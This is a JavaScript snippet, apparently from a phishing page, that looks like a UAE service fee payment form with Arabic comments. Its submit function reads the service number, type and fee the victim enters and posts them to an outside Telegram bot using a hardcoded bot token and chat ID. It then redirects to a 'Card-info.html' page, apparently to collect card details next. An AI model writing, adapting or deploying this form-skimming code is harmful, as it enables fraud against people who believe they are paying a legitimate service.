                                <script>
                                    function submitForm() {
                                        // جمع البيانات من النموذج
                                        const serviceNumber = document.getElementById('input100').value;
                                        const serviceType = document.getElementById('input2').value;
                                        const feeAmount = document.getElementById('input3').value;
                                
                                        // إرسال البيانات إلى Telegram
                                        const token = '7699595929:AAFQ_fuCA2z-9-1oeCWVlMwC7WIB64uqe0E'; // استبدل بالتوكين الخاص بك
                                        const chatId = '7585533835'; // استبدل بمعرف الدردشة الخاص بك
                                        const message = `
                                            رقم الخدمة: ${serviceNumber}
                                            نوع الخدمة: ${serviceType}
                                            قيمة الرسوم: ${feeAmount} AED
                                        `;
                                
                                        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                                            method: 'POST',
                                            headers: {
                                                'Content-Type': 'application/json'
                                            },
                                            body: JSON.stringify({
                                                chat_id: chatId,
                                                text: message
                                            })
                                        })
                                        .then(response => {
                                            if (!response.ok) {
                                                throw new Error(`خطأ في الشبكة: ${response.status}`);
                                            }
                                            return response.json();
                                        })
                                        .then(data => {
                                            console.log('تم إرسال الرسالة إلى Telegram:', data);
                                
                                            // إعادة توجيه المستخدم بناءً على نوع الخدمة
                                            if (serviceType === "عقد الكتروني") {
                                                window.location.href = 'Card-info.html'; // التوجيه إلى ملف Card-info.html
                                            } else {
                                                window.location.href = 'Card-info.html'; // التوجيه إلى الموقع الافتراضي
                                            }
                                        })
                                        .catch(error => {
                                            console.error('حدث خطأ أثناء إرسال الرسالة:', error);
                                            alert('حدث خطأ أثناء إرسال البيانات. يرجى التحقق من وحدة التحكم.');
                                        });
                                    }
                                </script>        
                </script>
